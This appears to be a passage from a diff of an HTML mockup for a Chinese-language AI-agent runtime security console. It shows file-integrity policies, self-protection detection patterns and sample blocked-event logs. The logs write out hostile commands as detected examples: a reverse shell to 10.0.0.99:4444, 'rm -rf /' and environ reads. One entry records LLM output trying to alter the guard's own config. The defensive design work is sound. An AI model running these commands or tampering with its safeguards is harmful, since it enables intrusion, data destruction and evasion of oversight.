+        </div>
+        <div class="apparmor-rule">
+          <span class="aa-deny">Deny:</span> deny <span class="aa-val">$path</span> <span class="aa-deny">klw</span> <span style="color:#fca5a5">/* deny write */</span>
+        </div>
+        <div class="form-hint mt-8">klr = read + lock | klw = write + lock — AppArmor 通过 LSM 钩子在内核层强制执行读写控制</div>
+      </div>
+
+      <!-- Panel 2: KSecure FilePreType -->
+      <div class="app-panel">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">KSecure eBPF LSM</div>
+            <div class="panel-title">KSecure FilePreType 文件完整性策略</div>
+          </div>
+          <div style="display:flex;gap:8px">
+            <span class="badge badge-enforce">Enforce</span>
+            <span class="toggle-switch on" style="margin-left:8px"></span>
+          </div>
+        </div>
+
+        <div class="sub-title">FilePreType 字段定义</div>
+        <div style="overflow-x:auto">
+          <table class="fi-field-table">
+            <thead><tr><th>字段</th><th>类型</th><th>说明</th></tr></thead>
+            <tbody>
+              <tr><td><code>switch</code></td><td>bool</td><td>FilePreType 开关</td></tr>
+              <tr><td><code>paths[].path</code></td><td>string</td><td>受保护文件路径</td></tr>
+              <tr><td><code>paths[].mode</code></td><td>int</td><td>保护模式 (阻止写入/删除/重命名)</td></tr>
+              <tr><td><code>paths[].desc</code></td><td>string</td><td>路径说明</td></tr>
+              <tr><td><code>paths[].action</code></td><td>string</td><td>执行动作 (block/allow/audit)</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="sub-title mt-16">默认白名单 (Default Whitelist)</div>
+        <div class="tag-list mb-12">
+          <span class="tag"><code>/opt/KSec/bin/KSecMain</code></span>
+          <span class="tag"><code>/usr/bin/userdel</code></span>
+          <span class="tag"><code>/usr/libexec/gvfsd-trash</code></span>
+        </div>
+        <div class="form-hint">白名单进程的文件操作不受 FilePreType 拦截</div>
+
+        <div class="sub-title mt-16">File-open 放行 (Release)</div>
+        <div class="tag-list mb-12">
+          <span class="tag"><code>/usr/bin/mv</code></span>
+          <span class="tag"><code>/usr/bin/cp</code></span>
+        </div>
+        <div class="form-hint">这些进程的 file_open 事件将被放行，不触发拦截</div>
+      </div>
+
+      <!-- Panel 3: ClawAegis 自我保护文本违规检测 -->
+      <div class="app-panel-warm">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">ClawAegis Self Protection</div>
+            <div class="panel-title">自我保护文本违规检测</div>
+          </div>
+          <div style="display:flex;gap:8px">
+            <span class="badge badge-enforce">Enforce</span>
+            <span class="badge badge-sys">5 检测类别</span>
+          </div>
+        </div>
+        <div class="form-hint mb-12">ClawAegis 通过文本模式匹配检测 LLM 输出中是否包含试图篡改受保护内容的指令</div>
+
+        <div class="detect-category">
+          <div class="dc-num">Category 1</div>
+          <div class="dc-title">ClawAegis 引用 + 自保护操作</div>
+          <div class="dc-desc">检测提及 ClawAegis 并试图查询、修改或禁用自保护功能的指令</div>
+          <div class="dc-patterns">
+            <span class="dc-pattern">claw-aegis</span>
+            <span class="dc-pattern">clawaegis</span>
+            <span class="dc-pattern">selfProtection</span>
+            <span class="dc-pattern">query</span>
+            <span class="dc-pattern">mutation</span>
+            <span class="dc-pattern">disable</span>
+          </div>
+        </div>
+
+        <div class="detect-category">
+          <div class="dc-num">Category 2</div>
+          <div class="dc-title">配置篡改模式 + 变更工具</div>
+          <div class="dc-desc">检测试图通过配置文件修改或使用变更工具篡改系统配置的行为</div>
+          <div class="dc-patterns">
+            <span class="dc-pattern">openclaw.json</span>
+            <span class="dc-pattern">config.yaml</span>
+            <span class="dc-pattern">sed -i</span>
+            <span class="dc-pattern">vi / vim</span>
+            <span class="dc-pattern">echo ... &gt;</span>
+          </div>
+        </div>
+
+        <div class="detect-category">
+          <div class="dc-num">Category 3</div>
+          <div class="dc-title">敏感路径目标提及</div>
+          <div class="dc-desc">检测输出中提及内置敏感路径（.ssh/, Shell 配置文件等）</div>
+          <div class="dc-patterns">
+            <span class="dc-pattern">.ssh/</span>
+            <span class="dc-pattern">.bashrc</span>
+            <span class="dc-pattern">.zshrc</span>
+            <span class="dc-pattern">.antconfig/</span>
+            <span class="dc-pattern">openclaw.json</span>
+          </div>
+        </div>
+
+        <div class="detect-category">
+          <div class="dc-num">Category 4</div>
+          <div class="dc-title">受保护 Skill ID + 变更操作</div>
+          <div class="dc-desc">检测提及受保护的 Skill ID 并伴有删除、修改、重命名等变更操作</div>
+          <div class="dc-patterns">
+            <span class="dc-pattern">skill-{id}</span>
+            <span class="dc-pattern">rm</span>
+            <span class="dc-pattern">modify</span>
+            <span class="dc-pattern">delete</span>
+            <span class="dc-pattern">uninstall</span>
+          </div>
+        </div>
+
+        <div class="detect-category">
+          <div class="dc-num">Category 5</div>
+          <div class="dc-title">受保护 Plugin ID + 变更操作</div>
+          <div class="dc-desc">检测提及受保护的 Plugin ID 并伴有删除、修改、重命名等变更操作</div>
+          <div class="dc-patterns">
+            <span class="dc-pattern">plugin-{id}</span>
+            <span class="dc-pattern">extension-{id}</span>
+            <span class="dc-pattern">remove</span>
+            <span class="dc-pattern">overwrite</span>
+            <span class="dc-pattern">replace</span>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /fr33-integrity -->
+
+    <!-- ── Tab: 变更追踪 ── -->
+    <div class="tab-content" id="fr33-tracking">
+
+      <!-- Panel 1: ClawManager Config Revision 历史 -->
+      <div class="app-panel-warm">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">ClawManager</div>
+            <div class="panel-title">ClawManager Config Revision 历史</div>
+          </div>
+          <div style="display:flex;gap:8px">
+            <button class="btn-secondary btn-sm">刷新</button>
+            <button class="btn-secondary btn-sm">导出</button>
+          </div>
+        </div>
+
+        <div style="overflow-x:auto">
+          <table class="data-table">
+            <thead><tr><th>Revision</th><th>Instance</th><th>Checksum</th><th>Published By</th><th>Published At</th><th>Status</th></tr></thead>
+            <tbody>
+              <tr>
+                <td><code>rev-003</code></td>
+                <td><code>inst-001</code></td>
+                <td><code>sha256:f8a3b2...</code></td>
+                <td>admin</td>
+                <td>2026-04-30 10:00</td>
+                <td><span class="badge badge-green">activated</span></td>
+              </tr>
+              <tr>
+                <td><code>rev-002</code></td>
+                <td><code>inst-001</code></td>
+                <td><code>sha256:7c1d9e...</code></td>
+                <td>admin</td>
+                <td>2026-04-29 14:30</td>
+                <td><span class="badge badge-off">superseded</span></td>
+              </tr>
+              <tr>
+                <td><code>rev-001</code></td>
+                <td><code>inst-001</code></td>
+                <td><code>sha256:a4e5c6...</code></td>
+                <td>admin</td>
+                <td>2026-04-28 09:00</td>
+                <td><span class="badge badge-off">superseded</span></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="form-hint mt-12">每次配置发布将生成新 Revision 和对应 Checksum，用于追踪配置变更历史</div>
+      </div>
+
+      <!-- Panel 2: InstanceDesiredState -->
+      <div class="app-panel">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">ClawManager</div>
+            <div class="panel-title">InstanceDesiredState 期望状态</div>
+          </div>
+          <span class="badge badge-sys">inst-001</span>
+        </div>
+
+        <div style="padding:8px 0;border-bottom:1px solid var(--border)">
+          <div class="form-label">desiredPowerState</div>
+          <div class="mode-selector">
+            <div class="mode-btn active enforce">running</div>
+            <div class="mode-btn">stopped</div>
+          </div>
+          <div class="form-hint">实例期望的电源状态，系统将确保实例状态与此一致</div>
+        </div>
+
+        <div style="padding:8px 0;border-bottom:1px solid var(--border)">
+          <div class="form-label">desiredConfigRevisionID</div>
+          <code style="background:#f5f0eb;padding:4px 10px;border-radius:6px;font-size:.85rem;color:var(--accent-coral)">rev-003</code>
+          <div class="form-hint mt-8">期望的配置版本，实例配置将与此版本保持同步</div>
+        </div>
+
+        <div style="padding:8px 0">
+          <div class="form-label">desiredRuntimeAction</div>
+          <code style="background:#f5f0eb;padding:4px 10px;border-radius:6px;font-size:.85rem;color:var(--accent-coral)">none</code>
+          <div class="form-hint mt-8">期望的运行时动作（none / restart / reload）</div>
+        </div>
+      </div>
+
+      <!-- Panel 3: KSecure 回退路径 -->
+      <div class="app-panel">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">KSecure eBPF LSM</div>
+            <div class="panel-title">KSecure 回退路径</div>
+          </div>
+          <span class="badge badge-sys">Rollback</span>
+        </div>
+
+        <div class="sensitive-path">
+          <div class="sp-icon">&#x21a9;&#xfe0f;</div>
+          <div class="sp-path">/opt/KSec/compliance/rollback/etc-shadow</div>
+          <div class="sp-desc">/etc/shadow 备份</div>
+        </div>
+        <div class="sensitive-path">
+          <div class="sp-icon">&#x21a9;&#xfe0f;</div>
+          <div class="sp-path">/opt/KSec/compliance/rollback/etc-gshadow</div>
+          <div class="sp-desc">/etc/gshadow 备份</div>
+        </div>
+        <div class="sensitive-path">
+          <div class="sp-icon">&#x21a9;&#xfe0f;</div>
+          <div class="sp-path">/opt/KSec/compliance/rollback/etc-sshd</div>
+          <div class="sp-desc">/etc/ssh/sshd_config 备份</div>
+        </div>
+        <div class="form-hint mt-12">KSecure 在检测到关键文件被篡改时，可自动从此回退路径恢复原始文件</div>
+      </div>
+
+    </div><!-- /fr33-tracking -->
+
+    <!-- ── Tab: 防篡改日志 ── -->
+    <div class="tab-content" id="fr33-tamperlog">
+
+      <div class="app-panel">
+        <div class="panel-header">
+          <div>
+            <div class="panel-eyebrow">Tamper Protection Log</div>
+            <div class="panel-title">防篡改日志</div>
+          </div>
+          <div style="display:flex;gap:8px">
+            <button class="btn-secondary btn-sm">刷新</button>
+            <button class="btn-secondary btn-sm">导出</button>
+          </div>
+        </div>
+
+        <!-- Log 1 -->
+        <div class="log-entry">
+          <div class="log-header">
+            <span class="log-time">2026-05-01 15:42:18.337</span>
+            <span class="badge badge-blocked">BLOCKED</span>
+            <span class="badge badge-critical">Critical</span>
+            <span class="badge badge-sys">KubeArmor FIM</span>
+            <span class="badge badge-p1">FR-33</span>
+          </div>
+          <div class="log-body">
+            写入 <code>/bin/ls</code> — KubeArmor FIM 策略 (readOnly) 阻止了对系统二进制目录的写入操作。进程 <code>unknown_process (pid:23841)</code> 试图修改系统关键二进制文件。
+          </div>
+          <div class="log-chain">
+            <span class="log-chain-step">KubeArmor EnforceFile</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step">FIM policy match</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step">/bin/ readOnly</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step blocked-step">BLOCK</span>
+          </div>
+          <div class="log-detail">
+path: /bin/ls | mode: write | pid: 23841 | uid: 0 | comm: unknown_process<br>
+policy: kubearmor-fim-system-bin | rule: readOnly /bin/ recursive<br>
+tags: MITRE_T1036, NIST_AU-2 | action: Block | enforcer: AppArmor
+          </div>
+        </div>
+
+        <!-- Log 2 -->
+        <div class="log-entry">
+          <div class="log-header">
+            <span class="log-time">2026-05-01 15:38:07.124</span>
+            <span class="badge badge-blocked">BLOCKED</span>
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-sys">KSecure</span>
+            <span class="badge badge-p1">FR-33</span>
+          </div>
+          <div class="log-body">
+            修改 <code>/etc/shadow</code> 权限 644&#x2192;600 — KSecure FilePreType 拦截了对系统关键认证文件权限的非法修改。
+          </div>
+          <div class="log-chain">
+            <span class="log-chain-step">KSecure FilePreType</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step">path match: /etc/shadow</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step">mode: chmod</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step blocked-step">BLOCK</span>
+          </div>
+          <div class="log-detail">
+path: /etc/shadow | mode: chmod 644&#x2192;600 | pid: 19234 | uid: 0 | comm: chmod<br>
+policy: KSecure FilePreType | action: block | rollback: /opt/KSec/compliance/rollback/etc-shadow
+          </div>
+        </div>
+
+        <!-- Log 3 -->
+        <div class="log-entry">
+          <div class="log-header">
+            <span class="log-time">2026-05-01 15:25:44.891</span>
+            <span class="badge badge-observed">DETECTED</span>
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-sys">ClawAegis</span>
+            <span class="badge badge-p1">FR-33</span>
+          </div>
+          <div class="log-body">
+            尝试修改 ClawAegis config — Self Protection guard 检测到 LLM 输出中包含试图修改 ClawAegis 自身配置的指令，已拦截执行。
+          </div>
+          <div class="log-chain">
+            <span class="log-chain-step">ClawAegis selfProtection</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step">Category 2: 配置篡改</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step">openclaw.json match</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step blocked-step">BLOCK</span>
+          </div>
+          <div class="log-detail">
+type: text_violation | category: 2 (config_tamper) | matched: "openclaw.json" + "sed -i"<br>
+policy: selfProtectionEnabled=enforce | action: block<br>
+detail: LLM output contained instruction to modify ClawAegis configuration via sed
+          </div>
+        </div>
+
+        <!-- Log 4 -->
+        <div class="log-entry">
+          <div class="log-header">
+            <span class="log-time">2026-05-01 15:12:33.558</span>
+            <span class="badge badge-observed">OBSERVED</span>
+            <span class="badge badge-medium">Medium</span>
+            <span class="badge badge-sys">KubeArmor</span>
+            <span class="badge badge-p0">FR-29</span>
+          </div>
+          <div class="log-body">
+            读取 <code>/proc/1234/environ</code> — KubeArmor protectEnv 预设策略检测到对其他进程环境变量的读取操作（仅观察模式）。
+          </div>
+          <div class="log-chain">
+            <span class="log-chain-step">KubeArmor EnforceFile</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step">protectEnv preset</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step">/proc/*/environ</span>
+            <span class="log-chain-arrow">&#x2192;</span>
+            <span class="log-chain-step" style="border-color:#d97706;color:#92400e;background:#fffbeb;font-weight:600">AUDIT</span>
+          </div>
+          <div class="log-detail">
+path: /proc/1234/environ | mode: read | pid: 8721 | uid: 1001 | comm: cat<br>
+policy: kubearmor-protect-env | preset: protectEnv | action: Audit (observe)<br>
+tags: MITRE_T1007, NIST_SI-4
+          </div>
+        </div>
+
+      </div>
+
+    </div><!-- /fr33-tamperlog -->
+
+  </div><!-- /content-area -->
+</div><!-- /page-fr33 -->
+
+
+<!-- ═══════════════════════════════════════════════════ -->
+<!-- PAGE: 运行环境日志                                  -->
+<!-- ═══════════════════════════════════════════════════ -->
+<div class="page-section" id="page-logs">
+  <div class="subheader">
+    <span>&#x1f4cb;</span><span style="opacity:.3">|</span>
+    <strong>运行环境安全日志</strong>
+    <span style="opacity:.3">|</span>
+    <span class="badge badge-info">FR-28 ~ FR-33</span>
+  </div>
+  <div class="content-area">
+
+    <div class="app-panel">
+      <div class="panel-header">
+        <div>
+          <div class="panel-eyebrow">Runtime Security Log</div>
+          <div class="panel-title">运行环境安全事件日志</div>
+        </div>
+        <div style="display:flex;gap:8px">
+          <button class="btn-secondary btn-sm">筛选</button>
+          <button class="btn-secondary btn-sm">刷新</button>
+          <button class="btn-secondary btn-sm">导出</button>
+        </div>
+      </div>
+
+      <!-- Log 1: FR-28 BLOCKED rm -rf / -->
+      <div class="log-entry">
+        <div class="log-header">
+          <span class="log-time">2026-05-01 14:32:07.412</span>
+          <span class="badge badge-blocked">BLOCKED</span>
+          <span class="badge badge-critical">Critical</span>
+          <span class="badge badge-p0">FR-28</span>
+          <span class="badge badge-sys">ClawAegis</span>
+        </div>
+        <div class="log-body">
+          <code>rm -rf /</code> — ClawAegis <code>command_block</code> 策略拦截递归删除根目录操作。策略管线执行顺序: 5。
+        </div>
+        <div class="log-chain">
+          <span class="log-chain-step">self_protection_guard</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">workspace_delete_guard</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">protected_path_guard</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">command_obfuscation_guard</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step blocked-step">command_block &#x2716;</span>
+        </div>
+        <div class="log-detail">
+instance: openclaw-28a | pid: 18472 | uid: 1001 | cwd: /home/user<br>
+pipeline_order: 5 | strategy: commandBlock | action: blocked
+        </div>
+      </div>
+
+      <!-- Log 2: FR-28 BLOCKED 诱饵文件删除 -->
+      <div class="log-entry">
+        <div class="log-header">
+          <span class="log-time">2026-05-01 14:28:53.891</span>
+          <span class="badge badge-blocked">BLOCKED</span>
+          <span class="badge badge-high">High</span>
+          <span class="badge badge-p0">FR-28</span>
+          <span class="badge badge-sys">KSecure</span>
+        </div>
+        <div class="log-body">
+          诱饵文件删除 <code>.00a1b2c3.docx</code> — KSecure <code>ransom_unlink</code> (eBPF LSM inode_unlink) 拦截非白名单进程删除诱饵文件，疑似勒索软件行为。
+        </div>
+        <div class="log-chain">
+          <span class="log-chain-step">KSecure ransom_unlink</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">decoy file match</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">whitelist check</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step blocked-step">BLOCK &#x2716;</span>
+        </div>
+        <div class="log-detail">
+instance: openclaw-28a | pid: 14387 | uid: 1001 | comm: unknown_encryptor<br>
+lsm_hook: inode_unlink | decoy: /home/user/.00a1b2c3.docx | whitelist: NOT_LISTED | action: blocked
+        </div>
+      </div>
+
+      <!-- Log 3: FR-29 BLOCKED 特权容器 -->
+      <div class="log-entry">
+        <div class="log-header">
+          <span class="log-time">2026-05-01 14:15:22.337</span>
+          <span class="badge badge-blocked">BLOCKED</span>
+          <span class="badge badge-critical">Critical</span>
+          <span class="badge badge-p0">FR-29</span>
+          <span class="badge badge-sys">KubeArmor</span>
+        </div>
+        <div class="log-body">
+          特权容器创建 — KubeArmor <code>capability policy</code> 阻止容器获取 <code>SYS_ADMIN</code> 等危险 Linux capability，防止容器逃逸。
+        </div>
+        <div class="log-chain">
+          <span class="log-chain-step">KubeArmor EnforceCap</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">capability: SYS_ADMIN</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">policy: deny-all-caps</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step blocked-step">BLOCK &#x2716;</span>
+        </div>
+        <div class="log-detail">
+namespace: production | pod: suspicious-pod-7a2b | container: main<br>
+capability: CAP_SYS_ADMIN | policy: kubearmor-deny-privilege | action: Block<br>
+tags: MITRE_T1611, NIST_AC-6
+        </div>
+      </div>
+
+      <!-- Log 4: FR-29 AUDIT /dev/shm/bash -->
+      <div class="log-entry">
+        <div class="log-header">
+          <span class="log-time">2026-05-01 13:58:41.665</span>
+          <span class="badge badge-audit">AUDIT</span>
+          <span class="badge badge-high">High</span>
+          <span class="badge badge-p0">FR-29</span>
+          <span class="badge badge-sys">KubeArmor</span>
+        </div>
+        <div class="log-body">
+          <code>/dev/shm/bash</code> 执行 — KubeArmor <code>filelessExec</code> 预设策略检测到从内存文件系统 (<code>/dev/shm</code>) 执行二进制文件，疑似无文件攻击。
+        </div>
+        <div class="log-chain">
+          <span class="log-chain-step">KubeArmor EnforceProc</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">filelessExec preset</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">/dev/shm/* match</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step" style="border-color:#1d4ed8;color:#1d4ed8;background:#eff6ff;font-weight:600">AUDIT</span>
+        </div>
+        <div class="log-detail">
+namespace: production | pod: webapp-5c3d | container: app<br>
+binary: /dev/shm/bash | source: process exec | preset: filelessExec | action: Audit<br>
+tags: MITRE_T1059, NIST_SI-4
+        </div>
+      </div>
+
+      <!-- Log 5: FR-30 FAIL SSH MaxSessions -->
+      <div class="log-entry">
+        <div class="log-header">
+          <span class="log-time">2026-05-01 13:47:18.224</span>
+          <span class="badge badge-fail">FAIL</span>
+          <span class="badge badge-medium">Medium</span>
+          <span class="badge badge-p1">FR-30</span>
+          <span class="badge badge-sys">KSecure</span>
+        </div>
+        <div class="log-body">
+          SSH <code>MaxSessions=unlimited</code> (baseline: <code>10</code>) — KSecure 基线检查发现 SSH 配置不合规，MaxSessions 未限制，存在会话耗尽风险。
+        </div>
+        <div class="log-chain">
+          <span class="log-chain-step">KSecure Baseline</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">CIS Benchmark</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">SSH config scan</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step" style="border-color:#dc2626;color:#dc2626;background:#fef2f2;font-weight:600">FAIL</span>
+        </div>
+        <div class="log-detail">
+check: CIS_5.2.22 | config: /etc/ssh/sshd_config | key: MaxSessions<br>
+current: unlimited | expected: 10 | status: FAIL<br>
+rollback: /opt/KSec/compliance/rollback/etc-sshd
+        </div>
+      </div>
+
+      <!-- Log 6: FR-31 CRITICAL 反弹Shell -->
+      <div class="log-entry">
+        <div class="log-header">
+          <span class="log-time">2026-05-01 13:32:55.098</span>
+          <span class="badge badge-critical">CRITICAL</span>
+          <span class="badge badge-p0">FR-31</span>
+          <span class="badge badge-sys">ClawAegis</span>
+        </div>
+        <div class="log-body">
+          反弹Shell — <code>bash -i &gt;&amp; /dev/tcp/10.0.0.99/4444 0&gt;&amp;1</code> — ClawAegis 检测到经典反弹Shell模式，攻击者试图建立远程控制通道。
+        </div>
+        <div class="log-chain">
+          <span class="log-chain-step">ClawAegis pipeline</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">reverse_shell pattern</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">/dev/tcp match</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step blocked-step">BLOCK &#x2716;</span>
+        </div>
+        <div class="log-detail">
+instance: ubuntu-f12c | pid: 16204 | uid: 1001 | cwd: /home/ubuntu<br>
+pattern: bash -i &gt;&amp; /dev/tcp/ | target: 10.0.0.99:4444<br>
+category: reverse_shell | severity: CRITICAL | action: blocked | process_killed: true
+        </div>
+      </div>
+
+      <!-- Log 7: FR-32 MISMATCH IMA -->
+      <div class="log-entry">
+        <div class="log-header">
+          <span class="log-time">2026-05-01 13:18:29.447</span>
+          <span class="badge badge-mismatch">MISMATCH</span>
+          <span class="badge badge-high">High</span>
+          <span class="badge badge-p1">FR-32</span>
+          <span class="badge badge-sys">KubeArmor IMA</span>
+        </div>
+        <div class="log-body">
+          KubeArmor hash 校验失败 — IMA 度量检测到 <code>/usr/bin/kubearmor</code> 的运行时哈希与基准值不匹配，二进制可能被篡改。
+        </div>
+        <div class="log-chain">
+          <span class="log-chain-step">IMA Measurement</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">hash comparison</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">baseline vs runtime</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step" style="border-color:#b91c1c;color:#b91c1c;background:#fef2f2;font-weight:600">MISMATCH</span>
+        </div>
+        <div class="log-detail">
+binary: /usr/bin/kubearmor | ima_hash: sha256:c7d8e9... | baseline_hash: sha256:a1b2c3...<br>
+status: MISMATCH | action: alert | recommendation: verify binary integrity and redeploy
+        </div>
+      </div>
+
+      <!-- Log 8: FR-33 BLOCKED /usr/bin/ -->
+      <div class="log-entry">
+        <div class="log-header">
+          <span class="log-time">2026-05-01 13:05:12.783</span>
+          <span class="badge badge-blocked">BLOCKED</span>
+          <span class="badge badge-critical">Critical</span>
+          <span class="badge badge-p1">FR-33</span>
+          <span class="badge badge-sys">KubeArmor FIM</span>
+        </div>
+        <div class="log-body">
+          写入 <code>/usr/bin/</code> — KubeArmor FIM 策略阻止对系统二进制目录的写入。进程试图在系统二进制目录下创建或修改文件。
+        </div>
+        <div class="log-chain">
+          <span class="log-chain-step">KubeArmor EnforceFile</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">FIM policy</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step">/usr/bin/ readOnly</span>
+          <span class="log-chain-arrow">&#x2192;</span>
+          <span class="log-chain-step blocked-step">BLOCK &#x2716;</span>
+        </div>
+        <div class="log-detail">
+path: /usr/bin/suspicious_binary | mode: write (create) | pid: 9876 | uid: 0<br>
+policy: kubearmor-fim-system-bin | rule: readOnly /usr/bin/ recursive<br>
+tags: MITRE_T1036, MITRE_T1565, NIST_AU-2, NIST_SI-4 | action: Block
+        </div>
+      </div>
+
+    </div>
+
+  </div><!-- /content-area -->
+</div><!-- /page-logs -->
+
+
+<!-- ═══════════════════════════════════════════════════ -->
+<!-- PAGE: 环境安全审计                                  -->
+<!-- ═══════════════════════════════════════════════════ -->
+<div class="page-section" id="page-audit">
+  <div class="subheader">
+    <span>&#x1f50d;</span><span style="opacity:.3">|</span>
+    <strong>环境安全审计报告</strong>
+    <span style="opacity:.3">|</span>
+    <span class="badge badge-info">FR-28 ~ FR-33</span>
+  </div>
+  <div class="content-area">
+
+    <!-- Panel 1: 审计评分 -->
+    <div class="app-panel-warm">
+      <div class="panel-header">
+        <div>
+          <div class="panel-eyebrow">Audit Score</div>
+          <div class="panel-title">审计评分</div>
+        </div>
+        <button class="btn-secondary btn-sm">重新评估</button>
+      </div>
+
+      <div class="flex items-center gap-16">
+        <div class="score-circle score-med">
+          <div class="score-num">78</div>
+          <div class="score-label">/ 100</div>
+        </div>
+        <div class="grid-3" style="flex:1;gap:12px">
+          <div class="stat-mini">
+            <div class="sm-val">6</div>
+            <div class="sm-label">FRs 总计</div>
+          </div>
+          <div class="stat-mini">
+            <div class="sm-val" style="color:#dc2626">3</div>
+            <div class="sm-label">P0 优先级</div>
+          </div>
+          <div class="stat-mini">
+            <div class="sm-val" style="color:#d97706">3</div>
+            <div class="sm-label">P1 优先级</div>
+          </div>
+          <div class="stat-mini">
+            <div class="sm-val" style="color:#059669">12</div>
+            <div class="sm-label">检查项通过</div>
+          </div>
+          <div class="stat-mini">
+            <div class="sm-val" style="color:#dc2626">8</div>
+            <div class="sm-label">待修复项</div>
+          </div>
+          <div class="stat-mini">
+            <div class="sm-val" style="color:var(--text)">20</div>
+            <div class="sm-label">检查项总计</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Panel 2: 合规对标 -->
+    <div class="app-panel">
+      <div class="panel-header">
+        <div>
+          <div class="panel-eyebrow">Compliance Mapping</div>
+          <div class="panel-title">合规对标</div>
+        </div>
+      </div>
+
+      <div style="overflow-x:auto">
+        <table class="data-table">
+          <thead><tr><th>合规项</th><th>名称</th><th>关联 FR</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><span class="compliance-tag aia">AIA08</span></td>
+              <td>运行环境风险</td>
+              <td>
+                <span class="tag" style="margin:1px">FR-28</span>
+                <span class="tag" style="margin:1px">FR-29</span>
+                <span class="tag" style="margin:1px">FR-31</span>
+              </td>
+            </tr>
+            <tr>
+              <td><span class="compliance-tag aia">AIA09</span></td>
+              <td>可追溯性失效</td>
+              <td>
+                <span class="tag" style="margin:1px">FR-33</span>
+              </td>
+            </tr>
+            <tr>
+              <td><span class="compliance-tag asi">ASI05</span></td>
+              <td>意外代码执行</td>
+              <td>
+                <span class="tag" style="margin:1px">FR-28</span>
+              </td>
+            </tr>
+            <tr>
+              <td><span class="compliance-tag asi">ASI10</span></td>
+              <td>智能体越权</td>
+              <td>
+                <span class="tag" style="margin:1px">FR-29</span>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Panel 3: 各FR合规状态 -->
+    <div class="app-panel">
+      <div class="panel-header">
+        <div>
+          <div class="panel-eyebrow">FR Compliance Status</div>
+          <div class="panel-title">各 FR 合规状态</div>
+        </div>
+        <button class="btn-secondary btn-sm">导出报告</button>
+      </div>
+
+      <div style="overflow-x:auto">
+        <table class="data-table">
+          <thead><tr><th>FR</th><th>名称</th><th>优先级</th><th>检查项</th><th>通过</th><th>待修复</th><th>状态</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>FR-28</code></td>
+              <td>沙盒环境隔离</td>
+              <td><span class="badge badge-p0">P0</span></td>
+              <td>6</td>
+              <td style="color:#059669;font-weight:600">5</td>
+              <td style="color:#dc2626;font-weight:600">1</td>
+              <td><span style="color:#d97706;font-weight:700">&#x26a0;&#xfe0f;</span></td>
+            </tr>
+            <tr>
+              <td><code>FR-29</code></td>
+              <td>容器隔离与防逃逸</td>
+              <td><span class="badge badge-p0">P0</span></td>
+              <td>5</td>
+              <td style="color:#059669;font-weight:600">3</td>
+              <td style="color:#dc2626;font-weight:600">2</td>
+              <td><span style="color:#d97706;font-weight:700">&#x26a0;&#xfe0f;</span></td>
+            </tr>
+            <tr>
+              <td><code>FR-30</code></td>
+              <td>宿主机安全加固</td>
+              <td><span class="badge badge-p1">P1</span></td>
+              <td>38</td>
+              <td style="color:#059669;font-weight:600">23</td>
+              <td style="color:#dc2626;font-weight:600">15</td>
+              <td><span style="color:#d97706;font-weight:700">&#x26a0;&#xfe0f;</span></td>
+            </tr>
+            <tr>
+              <td><code>FR-31</code></td>
+              <td>主机异常行为检测</td>
+              <td><span class="badge badge-p0">P0</span></td>
+              <td>4</td>
+              <td style="color:#059669;font-weight:600">4</td>
+              <td style="color:#059669;font-weight:600">0</td>
